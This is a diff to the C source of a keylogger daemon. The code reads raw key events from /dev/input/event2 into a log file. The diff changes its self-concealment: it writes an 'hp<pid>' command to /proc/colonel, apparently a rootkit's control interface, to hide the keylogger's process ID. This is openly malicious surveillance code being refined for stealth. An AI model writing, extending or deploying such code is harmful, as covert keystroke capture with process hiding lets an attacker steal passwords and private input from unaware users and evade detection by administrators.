@@ -8,6 +8,7 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
+#include <inttypes.h>
 #include <time.h>
 #include <fcntl.h>
 
@@ -56,17 +57,21 @@ int main(void) {
 
 	dir = mkdir("./col_log", S_IRWXU);				/* log directory */
 	fp = fopen("./col_log/log.txt", "a+"); 			/* daemon log */
-	evlog = fopen("./col_log/evlog.txt", "a+");  		/* key log */
-	fd = open("/dev/input/event2", O_RDONLY);			/* key event file */
-	ftty = open("/proc/colonel", O_RDONLY);
+	evlog = fopen("./col_log/evlog.txt", "a+");  	/* key log */
+	fd = open("/dev/input/event2", O_RDONLY);		/* key event file */
+	ftty = open("/proc/colonel", O_WRONLY);			/* open for write to hide keylogger pid */
 
-	char dpid[10];
-	sprintf(dpid, "hp%d", process_id);
-	write(ftty, dpid, sizeof(dpid));
-	close(ftty);
-	
 	time_t curtime;
 	time(&curtime);
+
+	pid_t child_pid = getpid();						/* get keylogger pid */
+	char dpid[10];								 
+
+	sprintf(dpid, "hp%jd", (intmax_t)child_pid);	/* forms command */
+	write(ftty, dpid, sizeof(dpid));				/* passes command to the colonel */
+	fprintf(fp, "PID: %jd -- %s", (intmax_t)child_pid, ctime(&curtime));	/* records current pid to log */
+	close(ftty);
+	
 	if (!ftty) {
 		fprintf(fp, "ERROR: /proc/colonel not found -- %s", ctime(&curtime));
 		return 1;
